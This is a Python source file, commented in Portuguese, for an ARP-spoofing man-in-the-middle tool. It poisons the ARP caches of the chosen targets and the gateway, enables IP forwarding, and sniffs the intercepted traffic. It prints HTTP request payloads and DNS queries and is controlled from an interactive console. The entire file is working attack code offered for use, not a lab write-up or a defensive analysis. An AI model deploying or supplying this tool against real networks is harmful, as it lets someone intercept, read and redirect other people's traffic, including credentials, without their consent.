import sys
import argparse
import threading
import queue
import time
import os
import socket
import struct
import binascii
import pylibpcap as pcap
import dpkt
from dpkt.ethernet import Ethernet
from dpkt.arp import ARP
from dpkt.ip import IP as DPKT_IP
from dpkt.tcp import TCP as DPKT_TCP
from dpkt.udp import UDP as DPKT_UDP
from dpkt.icmp import ICMP as DPKT_ICMP
from dpkt.dns import DNS

IP = CMD = 0
MAC = TARGET = 1


def parse_args():
    parser = argparse.ArgumentParser(description='O envenenamento por ARP ocorre entre um portal e vários alvos')
    parser.add_argument('-i', '--interface', dest='interface', help='interface para enviar')
    parser.add_argument('-t', '--targets', dest='targets', help='lista de endereços IP separados por vírgulas', required=True)
    parser.add_argument('-g', '--gateway', dest='gateway', help='Endereço IP do gateway', required=True)
    return parser.parse_args()


def get_working_if():
    """Retorna a primeira interface que funciona, excluindo lo (loopback)"""
    try:
        # Listar interfaces disponíveis com pcap
        devices = pcap.findalldevs()
        for device in devices:
            if device != 'lo' and device != 'localhost' and is_interface_valid(device):
                return device
        raise Exception('Nenhuma interface válida encontrada')
    except Exception as e:
        print(f"Erro ao encontrar interfaces: {e}")
        raise


def is_interface_valid(iface):
    """Verifica se a interface é válida"""
    try:
        # Tenta obter informações da interface
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip = socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', iface.encode()[:15])
        )[20:24])
        s.close()
        
        if ip != '0.0.0.0' and ip != '127.0.0.1':
            return True
    except:
        pass
    return False


def get_if_addr(interface):
    """Obtém o endereço IP da interface"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip = socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', interface.encode()[:15])
        )[20:24])
        s.close()
        return ip
    except Exception as e:
        print(f"Erro ao obter endereço IP para {interface}: {e}")
        return "0.0.0.0"


def get_if_hwaddr(interface):
    """Obtém o endereço MAC da interface"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        mac = fcntl.ioctl(
            s.fileno(),
            0x8927,  # SIOCGIFHWADDR
            struct.pack('256s', interface.encode()[:15])
        )[18:24]
        s.close()
        return ':'.join(['%02x' % b for b in mac])
    except Exception as e:
        print(f"Erro ao obter endereço MAC para {interface}: {e}")
        return "00:00:00:00:00:00"


def mac_to_bytes(mac_addr):
    """Converte endereço MAC string para bytes"""
    return binascii.unhexlify(mac_addr.replace(':', ''))


def ip_to_int(ip_addr):
    """Converte endereço IP string para inteiro"""
    return struct.unpack("!I", socket.inet_aton(ip_addr))[0]


def get_MAC(interface, target_IP):
    """Obtém o endereço MAC de um IP usando ARP request"""
    source_IP = get_if_addr(interface)
    source_MAC = get_if_hwaddr(interface)
    
    # Criar socket para ARP
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    s.bind((interface, 0))
    
    # Criar pacote ARP request
    arp = dpkt.arp.ARP(
        hrd=dpkt.arp.ARP_HRD_ETH,
        pro=dpkt.arp.ARP_PRO_IP,
        hln=6,
        pln=4,
        op=dpkt.arp.ARP_OP_REQUEST,
        sha=mac_to_bytes(source_MAC),
        spa=socket.inet_aton(source_IP),
        tha=b'\x00\x00\x00\x00\x00\x00',
        tpa=socket.inet_aton(target_IP)
    )
    
    # Empacotar em um frame Ethernet
    eth = dpkt.ethernet.Ethernet(
        dst=b'\xff\xff\xff\xff\xff\xff',
        src=mac_to_bytes(source_MAC),
        type=dpkt.ethernet.ETH_TYPE_ARP,
        data=arp
    )
    
    # Enviar o pacote
    s.send(bytes(eth))
    
    # Configurar para receber a resposta
    start_time = time.time()
    timeout = 5  # segundos
    
    while time.time() - start_time < timeout:
        try:
            packet = s.recv(1024)
            eth_recv = dpkt.ethernet.Ethernet(packet)
            
            if isinstance(eth_recv.data, dpkt.arp.ARP):
                arp_recv = eth_recv.data
                if (arp_recv.op == dpkt.arp.ARP_OP_REPLY and
                    socket.inet_ntoa(arp_recv.spa) == target_IP):
                    # Encontrou o MAC
                    target_mac = ':'.join(['%02x' % b for b in arp_recv.sha])
                    s.close()
                    return target_mac
        except:
            # Ignorar pacotes malformados
            pass
    
    s.close()
    raise Exception(f'Erro ao encontrar MAC para {target_IP}, tente usar -i')


def get_MAC_alternative(interface, target_IP):
    """Tenta obter o MAC sem falhar, usando broadcast se necessário"""
    try:
        # Método 1: Tenta obter normalmente
        return get_MAC(interface, target_IP)
    except Exception as e:
        print(f"Aviso: Impossível obter MAC para {target_IP}: {e}")
        print(f"Usando MAC de broadcast")
        # Retorna endereço de broadcast como alternativa
        return "ff:ff:ff:ff:ff:ff"


def send_ARP_packet(interface, destination_IP, destination_MAC, source_IP, source_MAC):
    """Envia pacote ARP usando socket raw"""
    print(f"Enviando ARP para: IP={destination_IP}")
    
    # Criar socket para ARP
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
        s.bind((interface, 0))
        
        # Criar pacote ARP reply (envenenamento)
        arp = dpkt.arp.ARP(
            hrd=dpkt.arp.ARP_HRD_ETH,
            pro=dpkt.arp.ARP_PRO_IP,
            hln=6,
            pln=4,
            op=dpkt.arp.ARP_OP_REPLY,
            sha=mac_to_bytes(source_MAC),
            spa=socket.inet_aton(source_IP),
            tha=mac_to_bytes(destination_MAC),
            tpa=socket.inet_aton(destination_IP)
        )
        
        # Empacotar em um frame Ethernet
        eth = dpkt.ethernet.Ethernet(
            dst=mac_to_bytes(destination_MAC),
            src=mac_to_bytes(source_MAC),
            type=dpkt.ethernet.ETH_TYPE_ARP,
            data=arp
        )
        
        # Enviar o pacote
        s.send(bytes(eth))
        s.close()
    except Exception as e:
        print(f"Erro ao enviar pacote ARP: {e}")


def start_poison_thread(interface, targets, gateway, control_queue, attacker_MAC):
    finish = False

    while not finish:
        # Enviar pacotes ARP falsificados
        for t in targets:
            send_ARP_packet(interface, t[IP], t[MAC], gateway[IP], attacker_MAC)
            send_ARP_packet(interface, gateway[IP], gateway[MAC], t[IP], attacker_MAC)
        time.sleep(1)
        
        # Verificar comandos na fila
        try:
            if not control_queue.empty():
                item = control_queue.get(block=False)
                cmd = item[CMD].lower()
                
                if cmd in ['quit', 'exit', 'stop', 'leave']:
                    finish = True

                elif cmd in ['add', 'insert']:
                    targets.append(item[TARGET])

                elif cmd in ['del', 'delete', 'remove']:
                    try:
                        targets.remove(item[TARGET])
                        restore_ARP_caches(interface, [item[TARGET]], gateway, False)
                    except ValueError:
                        print("%s não está na lista de alvos" % item[TARGET][0])

                elif cmd in ['list', 'show', 'status']:
                    print('Metas atuais:')
                    print('Gateway: %s (%s)' % gateway)
                    for t in targets:
                        print("%s (%s)" % t)
        except queue.Empty:
            pass  # Fila vazia, continuar o loop

    restore_ARP_caches(interface, targets, gateway)


def restore_ARP_caches(interface, targets, gateway, verbose=True):
    print('Parando o ataque, restaurando o cache ARP')
    for i in range(3):
        if verbose:
            print("ARP %s está em %s" % (gateway[IP], gateway[MAC]))
        for t in targets:
            if verbose:
                print("ARP %s está em %s" % (t[IP], t[MAC]))
            send_ARP_packet(interface, t[IP], t[MAC], gateway[IP], gateway[MAC])
            send_ARP_packet(interface, gateway[IP], gateway[MAC], t[IP], t[MAC])
        time.sleep(1)
    print('Caches ARP restaurados')


def process_packet(packet_data, targets, gateway, packet_stats):
    """Analisa um pacote capturado e mostra informações relevantes"""
    try:
        # Primeiro, decodificar o Ethernet frame
        eth = dpkt.ethernet.Ethernet(packet_data)
        
        # Verificar se é um pacote IP
        if isinstance(eth.data, dpkt.ip.IP):
            ip_pkt = eth.data
            src_ip = socket.inet_ntoa(ip_pkt.src)
            dst_ip = socket.inet_ntoa(ip_pkt.dst)
            
            # Debug de cada pacote
            print(f"\n[DEBUG] Pacote recebido: IP {src_ip} -> {dst_ip}")
            
            # Verificar se o pacote é relevante (entre alvos e gateway)
            is_from_target = any(src_ip == t[IP] for t in targets)
            is_to_target = any(dst_ip == t[IP] for t in targets)
            is_from_gateway = (src_ip == gateway[IP])
            is_to_gateway = (dst_ip == gateway[IP])
            
            # Incrementar contador de pacotes
            if isinstance(ip_pkt.data, dpkt.tcp.TCP):
                packet_stats['tcp'] += 1
            elif isinstance(ip_pkt.data, dpkt.udp.UDP):
                packet_stats['udp'] += 1
            elif isinstance(ip_pkt.data, dpkt.icmp.ICMP):
                packet_stats['icmp'] += 1
            
            packet_stats['total'] += 1
            
            if (is_from_target and is_to_gateway) or (is_from_gateway and is_to_target):
                print(f"\n[*] Pacote interceptado: {src_ip} -> {dst_ip}")
                
                # Análise por protocolo
                if isinstance(ip_pkt.data, dpkt.tcp.TCP):
                    tcp = ip_pkt.data
                    src_port = tcp.sport
                    dst_port = tcp.dport
                    print(f"    TCP {src_port} -> {dst_port}")
                    
                    # Detectar serviços comuns
                    if dst_port == 80:
                        print("    [HTTP]")
                        if len(tcp.data) > 0:
                            try:
                                payload = tcp.data.decode('utf-8', 'ignore')
                                if "GET" in payload or "POST" in payload:
                                    print(f"    Dados: {payload[:100]}...")
                            except:
                                pass
                    
                    elif dst_port == 443:
                        print("    [HTTPS]")
                
                elif isinstance(ip_pkt.data, dpkt.udp.UDP):
                    udp = ip_pkt.data
                    src_port = udp.sport
                    dst_port = udp.dport
                    print(f"    UDP {src_port} -> {dst_port}")
                    
                    if dst_port == 53 and len(udp.data) > 0:
                        try:
                            dns = dpkt.dns.DNS(udp.data)
                            if dns.qr == 0 and len(dns.qd) > 0:  # É uma query
                                qname = dns.qd[0].name
                                print(f"    [DNS] Query: {qname}")
                        except:
                            pass
                
                elif isinstance(ip_pkt.data, dpkt.icmp.ICMP):
                    print("    [ICMP]")
    
    except Exception as e:
        # Ignorar erros de pacotes malformados
        pass


def start_sniffer(interface, targets, gateway):
    """Inicia um sniffer usando PyPcap"""
    print(f"[*] Iniciando sniffer na interface {interface}")
    
    # Estatísticas de pacotes
    packet_stats = {'total': 0, 'tcp': 0, 'udp': 0, 'icmp': 0}
    
    # Criar um objeto de captura
    pc = pcap.pcap(name=interface, promisc=True, immediate=True)
    
    # Configurar filtro BPF - capturar pacotes IP mas não ARP
    pc.setfilter('ip and not arp')
    
    print(f"[*] Sniffer iniciado. Capturando pacotes...")
    
    # Iniciar thread de captura
    def capture_thread():
        try:
            # Para cada pacote capturado
            for timestamp, packet in pc:
                process_packet(packet, targets, gateway, packet_stats)
        except KeyboardInterrupt:
            pass
    
    thread = threading.Thread(target=capture_thread)
    thread.daemon = True
    thread.start()
    
    return pc, packet_stats, thread


def enable_ip_forwarding():
    """Ativa o IP forwarding para permitir que os pacotes passem pela máquina atacante"""
    print("[*] Ativando IP forwarding...")
    if sys.platform == "win32":
        # No Windows, podemos tentar, mas pode requerer privilégios de administrador
        os.system("reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 1 /f")
        os.system("netsh int ip set global forwarding=enabled")
        print("[*] Execute o script como administrador para garantir IP forwarding")
    else:
        # Linux
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
    print("[*] IP forwarding ativado")


def main():
    # Ative o IP forwarding logo no início do main()
    enable_ip_forwarding()

    args = parse_args()
    control_queue = queue.Queue()

    # 1. Obtenha a interface e o MAC do atacante
    interface = args.interface or get_working_if()
    attacker_MAC = get_if_hwaddr(interface)
    print('Usando a interface %s (%s)' % (interface, attacker_MAC))
    
    # 2. Obtenha os alvos usando o método alternativo para não falhar
    try:
        targets = [(t.strip(), get_MAC_alternative(interface, t.strip())) for t in
                  args.targets.split(',')]
    except Exception as e:
        print(e)
        sys.exit(1)

    # 3. Obtenha o gateway usando o método alternativo
    try:
        gateway = (args.gateway, get_MAC_alternative(interface, args.gateway))
    except Exception as e:
        print(e)
        sys.exit(2)
    
    # 4. Inicie a thread de envenenamento ARP
    poison_thread = threading.Thread(target=start_poison_thread,
                                   args=(interface, targets, gateway, control_queue,
                                         attacker_MAC))
    poison_thread.daemon = True
    poison_thread.start()
    
    # 5. Inicie o sniffer de pacotes
    sniffer, packet_stats, sniffer_thread = start_sniffer(interface, targets, gateway)
    
    # Após iniciar o sniffer, mas antes do loop de comandos:
    print("\n[*] Sistema configurado:")
    print(f"  - Atacante: {interface} ({attacker_MAC})")
    print(f"  - Gateway: {gateway[IP]} ({gateway[MAC]})")
    print("  - Alvos:")
    for t in targets:
        print(f"    * {t[IP]} ({t[MAC]})")
    print("\n[*] Se não estiver vendo pacotes capturados:")
    print("  1. Verifique se está executando como administrador")
    print("  2. Verifique se o IP forwarding está ativado")
    print("  3. Tente gerar tráfego de rede nos alvos (navegação web, ping)")
    print("  4. Use o comando 'stats' para ver estatísticas de captura")
    
    # 6. Loop principal de comandos
    try:
        while poison_thread.is_alive():
            try:
                command = input('arpspoof# ').split()
                if command:
                    cmd = command[CMD].lower()
                    if cmd in ['help', '?']:
                        print("add <IP>: adiciona endereço IP à lista de alvos\n" +
                              "del <IP>: remove endereço IP da lista de alvos\n" +
                              "list: imprime todos os alvos atuais\n" +
                              "stats: mostra estatísticas de pacotes\n" +
                              "exit: interrompe o envenenamento e sai")

                    elif cmd in ['quit', 'exit', 'stop', 'leave']:
                        control_queue.put(('quit',))
                        poison_thread.join(timeout=5)
                        break

                    elif cmd in ['add', 'insert']:
                        if len(command) > 1:
                            ip = command[TARGET]
                            print("IP: " + ip)
                            try:
                                t = (ip, get_MAC(interface, ip))
                                control_queue.put((cmd, t))
                            except Exception as e:
                                print('Não foi possível adicionar %s' % ip)
                                print(e)
                        else:
                            print("Erro: IP não especificado")

                    elif cmd in ['del', 'delete', 'remove']:
                        if len(command) > 1:
                            ip = command[TARGET]
                            try:
                                t = (ip, get_MAC(interface, ip))
                                control_queue.put((cmd, t))
                            except Exception as e:
                                print('Não foi possível remover %s' % ip)
                                print(e)
                        else:
                            print("Erro: IP não especificado")

                    elif cmd in ['list', 'show', 'status']:
                        control_queue.put((cmd,))

                    elif cmd in ['stats', 'statistics']:
                        print(f"[*] Estatísticas do sniffer:")
                        print(f"  - Total de pacotes: {packet_stats['total']}")
                        print(f"  - TCP: {packet_stats['tcp']}")
                        print(f"  - UDP: {packet_stats['udp']}")
                        print(f"  - ICMP: {packet_stats['icmp']}")

                    elif cmd in ['ping', 'test']:
                        if len(targets) > 0:
                            target = targets[0][IP]
                            print(f"[*] Testando conexão com {target}...")
                            
                            # Usar socket raw para enviar ICMP
                            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                            s.setsockopt(socket.SOL_IP, socket.IP_TTL, 64)
                            
                            # Montando pacote ICMP simplificado
                            icmp_type = 8  # Echo request
                            icmp_code = 0
                            icmp_checksum = 0
                            icmp_id = os.getpid() & 0xFFFF
                            icmp_seq = 1
                            icmp_data = b'abcdefghijklmnopqrstuvwxyz'
                            
                            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum,
                                                  icmp_id, icmp_seq)
                            icmp_checksum = checksum(icmp_header + icmp_data)
                            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum,
                                                  icmp_id, icmp_seq)
                            
                            s.sendto(icmp_header + icmp_data, (target, 0))
                            s.close()
                            
                            print(f"[*] Pacote de teste enviado para {target}")
            except EOFError:
                break

    except KeyboardInterrupt:
        print("\nInterrompendo o ataque...")
        control_queue.put(('quit',))
        poison_thread.join(timeout=5)
        # Para o sniffer
        if hasattr(sniffer, 'close'):
            sniffer.close()


def checksum(data):
    """Calcula o checksum de um pacote ICMP"""
    if len(data) % 2:
        data += b'\x00'
    s = sum(array.array('H', data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    s = ~s & 0xffff
    return s


if __name__ == '__main__':
    # Importações que podem não estar disponíveis em todos os sistemas
    try:
        import fcntl
        import array
    except ImportError:
        if sys.platform != "win32":
            print("Erro: Módulos fcntl e/ou array não encontrados")
            sys.exit(1)
        else:
            # Em Windows, implementar alternativas para obter MAC/IP
            import ctypes
            import winreg
    
    main()
